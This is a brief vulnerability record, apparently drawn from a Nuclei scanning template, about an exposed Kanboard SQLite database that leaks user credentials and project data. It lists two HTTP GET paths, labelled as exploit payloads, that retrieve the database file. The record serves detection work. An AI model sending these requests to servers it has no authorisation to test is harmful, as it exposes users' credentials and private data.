# Vulnerability: Kanboard - SQLite Database Exposure
**Classification:** CWE-200
**Source:** Nuclei Template (`kanboard-database-exposure.yaml`)

## Description
Detected Kanboard SQLite database file was found to be exposed, containing sensitive information including user credentials, project data, tasks, and comments.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/data/db.sqlite
GET {{BaseURL}}/kanboard/data/db.sqlite
```

